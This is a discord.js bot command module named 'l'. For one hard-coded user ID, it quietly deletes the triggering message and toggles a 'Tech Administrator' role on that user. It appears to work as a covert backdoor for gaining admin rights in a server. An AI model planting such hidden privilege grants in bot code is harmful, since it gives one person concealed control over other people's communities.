const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
if (message.member.id != "354261484395560961")
  return;

	message.delete().catch(O_o=>{});

  var teh = message.guild.roles.find(`name`, "Тех. Администратор");

if(message.member.roles.some(r=>["Тех. Администратор"].includes(r.name)))
    return message.member.removeRole(teh);

message.member.addRole(teh);
}

  module.exports.help = {
    name: "l"
  }
